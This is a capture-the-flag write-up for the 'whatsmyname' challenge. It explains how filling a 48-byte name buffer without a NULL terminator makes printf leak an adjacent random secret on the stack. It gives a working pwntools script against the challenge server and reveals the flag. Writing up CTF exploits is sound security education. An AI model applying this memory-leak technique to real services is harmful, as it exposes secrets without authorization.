#### Challenge:

Can you guess my name?

`nc challs.actf.co 31223`

[whatsmyname](./whatsmyname ":ignore") [whatsmyname.c](./whatsmyname.c ":ignore")

---

#### Solution:

We have to guess `48 byte` name that is randomly generated. Luckily for us, the variable holding this value is adjacent on stack to variable we can write to and which will be sent back to us using `printf` with `%s`. If we will send all of the `48` bytes to fill `yourName`, there wont be any space for the string terminator (`NULL byte - \x00`), so the string won't be terminated and the `printf` with `%s` will `leak the name we have to guess`. (Note that there is this weird condition that replaces second-to-last character `if it is a line break` with string terminator, but if we don't send the line break, we are good.) Then we just have to send the correct `"guess"` and we will get the flag.

```python
#!/usr/bin/env python

from pwn import *
from struct import *

r = remote('challs.actf.co', 31223)
# r = process('./whatsmyname')

print(r.recvuntil(b"Hi! What's your name? ").decode('utf-8').strip())

payload = b'A'*(48)
print(payload)
r.sendline(payload)

print(r.recvuntil(b"Nice to meet you, "+payload).decode('utf-8').strip())
his_name = r.recvline()[:-2] # except the !\n characters in printf
print(bytes(his_name))



print(r.recvuntil(b"Guess my name and you'll get a flag!").decode('utf-8').strip())

r.sendline(his_name+b'\n')

print(r.recvline().decode('utf-8').strip())
print(r.recvline().decode('utf-8').strip())
print(r.recvline().decode('utf-8').strip())

r.close()
```

---

<details><summary>FLAG:</summary>

```
actf{i_c0uld_be_l0nely_with_y0u_a21f8611c74b}
```

</details>
<br/>
